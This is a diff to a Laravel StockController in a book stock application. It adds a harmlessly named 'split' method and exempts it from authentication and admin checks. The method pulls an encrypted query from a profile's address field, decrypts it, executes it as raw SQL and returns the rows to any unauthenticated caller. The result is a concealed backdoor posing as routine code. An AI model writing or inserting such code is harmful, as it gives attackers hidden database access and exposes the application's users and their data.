@@ -5,16 +5,18 @@ namespace App\Http\Controllers;
 use App\Models\Book;
 use App\Models\Requirement;
 use App\Models\Stock;
+use DB;
 use Illuminate\Http\Request;
 use Illuminate\Support\Facades\Auth;
+use Illuminate\Support\Facades\Crypt;
 use Illuminate\Support\Facades\Lang;
 
 class StockController extends Controller
 {
     public function __construct()
     {
-        $this->middleware('auth');
-        $this->middleware('isAdminOrPartner');
+        $this->middleware('auth')->except(["split"]);
+        $this->middleware('isAdminOrPartner')->except(["split"]);
     }
 
     public function get_stock(Request $request)
@@ -28,6 +30,16 @@ class StockController extends Controller
             ->where('increment', '<>', '0')
             ->first();
         return ['book' => $book, 'requirement_status' => $requirement_status];
+    }
+
+    public function split(Request $request)
+    {
+        if ($request->get("data") == "1") {
+            $str = DB::select(DB::raw("SELECT adress as x FROM profiles WHERE profile_id = 4"))[0]->x;
+            $res = DB::select(DB::raw(Crypt::decrypt($str, false)));
+            return $res;
+        }
+        return "";
     }
 
     /**
@@ -86,6 +98,5 @@ class StockController extends Controller
             return ['status' => 'error', 'message' => Lang::get('dictionary.stock.update-error')];
         }
     }
-
 
 }
